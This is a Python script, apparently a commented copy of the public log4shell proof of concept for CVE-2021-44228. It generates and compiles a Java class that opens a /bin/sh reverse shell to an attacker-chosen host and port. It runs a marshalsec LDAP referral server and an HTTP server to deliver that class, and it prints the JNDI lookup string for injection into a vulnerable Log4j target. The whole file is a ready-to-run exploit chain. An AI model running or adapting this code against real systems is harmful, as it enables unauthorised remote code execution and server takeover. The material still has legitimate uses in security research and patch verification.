#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Get the present working directory
CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(userip: str, lport: int) -> None:
    """Function to generate Exploit Java code and class file to be stored in LDAP Server"""

    # Define the Exploit Java code
    # Accepts LDAP Server host and Reverse Shell port dynamically
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)

    # Define the Exploit Java code filename as "Exploit.java"
    p = Path("Exploit.java")

    try:
        # Write the Exploit Java code to the filename "Exploit.java"
        p.write_text(program)

        # Compile the Exploit Java code
        subprocess.run([os.path.join(CUR_FOLDER, "java-8-openjdk-amd64/bin/javac"), str(p)])

    except OSError as e:
        # Print any errors while running the code
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e

    else:
        # Else print the successful execution of code
        print(Fore.GREEN + '[+] Exploit java class created success')


def payload(userip: str, webport: int, lport: int) -> None:
    """Function to start LDAP Server"""

    # Call function to generate Exploit Java code and class file
    generate_payload(userip, lport)

    # Print message as starting LDAP server
    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # Create the LDAP server on new thread
    # Define the thread targeting the "ldap_server" function 
    # Run the LDAP Server on "userip" server and "webport" port
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    # Start the thread
    t1.start()

    # Start the LDAP web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    # Continuously run the LDAP server
    httpd.serve_forever()


def check_java() -> bool:
    """Function to check if Java '1.8.0_342' is installed"""

    # Check if Java "1.8.0_342" is installed in Present Working Directory
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, 'java-8-openjdk-amd64/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    # Return "True" if correct Java is installed
    return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
    """Function to setup LDAP link"""
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "java-8-openjdk-amd64/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    """The main function"""

    # Initialize colorama
    init(autoreset=True)

    # Print details of the GitHub repo
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")

    # Declare the argument parser
    parser = argparse.ArgumentParser(description='log4shell PoC')

    # Add argument to get LDAP Server address
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')

    # Add argument to get LDAP Server port
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')

    # Add argument to get NetCat Reverse Shell listening port
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    # Parse the arguments
    args = parser.parse_args()

    try:
        # Check if Java "java-8-openjdk-amd64" is installed
        if not check_java():
            # Exit code if Java is not installed
            print(Fore.RED + '[-] Java is not installed inside the repository')
            raise SystemExit(1)
        
        # Generate the Java code and class file
        payload(args.userip, args.webport, args.lport)

    except KeyboardInterrupt:
        # Exit code gracefully if interrupted by user
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


# Call the main function
if __name__ == "__main__":
    main()
